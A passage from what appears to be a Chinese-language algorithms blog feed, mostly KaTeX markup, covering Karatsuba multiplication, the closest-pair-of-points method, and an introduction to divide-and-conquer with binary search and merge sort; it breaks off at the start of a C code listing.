style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0213299999999998em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mord mtight">/</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7977219999999999em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0213299999999998em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mord mtight">/</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0213299999999998em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mord mtight">/</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7977219999999999em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0213299999999998em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mord mtight">/</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><h2 id="计算内容">计算内容</h2><p>根据上述的分割，递归地（因为可能仍然是大数）计算：<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><msub><mi>x</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><msub><mi>y</mi><mn>1</mn></msub><mo>+</mo><msub><mi>y</mi><mn>0</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_1+x_0)*(y_1+y_0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>y</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">x_1*y_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>0</mn></msub><mo>∗</mo><msub><mi>y</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">x_0*y_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br>然后将他们合并到S中即可解出。</p><h2 id="复杂度">复杂度</h2><p>递推式可以表示为：<br>𝑇(𝑛) = 3𝑇(𝑛/2) + 𝑂(𝑛)<br>根据<code>主定理</code>解得：<br>𝑂(𝑛 𝑙𝑜𝑔23 ) ≈ 𝑂(𝑛 1.585)</p><h1 id="矩阵乘法-strassen算法">矩阵乘法-Strassen算法</h1><p>// 略…</p><h1 id="最接近点对">最接近点对</h1><ol><li>将各点根据各点的x坐标排序</li><li>如果点数量小于等于3，直接计算即可</li><li>将点集分为左右2部分</li><li>递归地在左右2部分计算出最近距离d1和d2</li><li>取d=min(d1, d2)</li><li>在2子集的中间边界内，找出横跨边界的点对中最近的距离d3</li><li>取min(d, d3)作为最终结果</li></ol><p>注意：算法的一个关键就是中间部分的处理，根据鸽巢原理可以大大优化算法，详见：<br><a href="https://blog.csdn.net/Carl_Rabbit/article/details/106840395">最邻近点对问题(Closest-Pair Problem)：二维的分治解法详解_closestpair算法-CSDN博客</a><br><a href="https://oi-wiki.org/geometry/nearest-points/">平面最近点对 - OI Wiki</a></p><p>注：本文参考自课程ppt</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 分治算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分治算法</title>
      <link href="/2024d3dcfc3fc646/"/>
      <url>/2024d3dcfc3fc646/</url>
      
        <content type="html"><![CDATA[<h1 id="分治算法">分治算法</h1><p><code>分治算法</code>的核心思想就是“分而治之”。将一个规模为<strong>n</strong>的问题分解为划分成 n 个规模较小，并且结构与原问题相似的子问题，递归地解决这些子问题，最后进行合并即可得到原规模问题的解。</p><p>分治算法的性质让其很适合用<code>递归</code>的编程技巧来实现。有如下几步：</p><ol><li>分解：先将原问题拆分，例如下标边界的分割，直到分解到最小。</li><li>解决：递归向下解决各个子问题，如果问题规模达到最小，则直接求解即可。</li><li>合并：递归完成后在上层合并为整个问题的解。</li></ol><p>分治算法必须满足以下几个条件：</p><ol><li>问题缩小到一定程度可以直接求解。</li><li>该问题可以分解为若干个规模较小的相同问题，即该问题具有最优子结构性质。</li><li>各个子问题的解可以合并为更大规模问题解。</li><li>分解出的各个子问题是相互独立的，即子问题之间不包含公共的子问题。</li></ol><h2 id="二分查找">二分查找</h2><p>二分查找需要满足如下条件：</p><ol><li>数据使用顺序表（数组）存储</li><li>数据必须有序，一般从小到大</li><li>数据量太小并不适合使用二分查找</li><li>数据量太大也不适合，主要是因为一个超大的顺序表对内存的要求过高，可能无法存储</li></ol><p>代码实现：<a href="https://gngtwhh.github.io/2024-01-16-b79ee0df7e0a/">二分查找模板 | WAHAHA’s blog</a></p><h2 id="归并排序">归并排序</h2><p>将待排序数组进行二分，对每一个分组同样不断进行二分，分解到底部后，从小往大再逐渐重新合并，在合并的同时依次按顺序选择合并的值以达到排序的作用。</p><p>递推公式：merge_sort(p…r) = merge(merge_sort(p…q), merge_sort(q+1…r))</p><p>终止条件：p &gt;= r 不用再继续分解</p><p>性质：</p><ol><li>归并排序是否稳定取决于merge函数，可以保证值相同的元素，在合并前后的先后顺序不变，所以归并排序是稳定的。</li><li>时间复杂度为<code>O(nlogn)</code></li><li>由于递归时，堆栈会不断地创建（压栈）和销毁（出栈），因此临时空间不会超过n个数据的大小（不考虑程序实现的额外空间），空间复杂度为<code>O(n)</code>，而不是<code>O(nlogn)</code>，要注意归并排序并不是原地排序。</li></ol><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td 